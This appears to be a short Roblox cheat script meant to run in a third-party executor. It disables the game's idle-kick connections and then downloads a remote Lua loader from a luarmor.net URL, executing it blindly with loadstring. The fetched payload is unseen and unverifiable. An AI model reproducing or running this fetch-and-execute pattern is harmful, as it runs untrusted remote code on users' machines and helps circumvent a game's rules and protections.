Client = game.Players.LocalPlayer
if getconnections then
        for i,v in pairs(getconnections(Client.Idled)) do
            v:Disable() 
        end
end
wait()
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/2693ba4d4a0e7bee68d089f2a1ba4f37.lua"))()
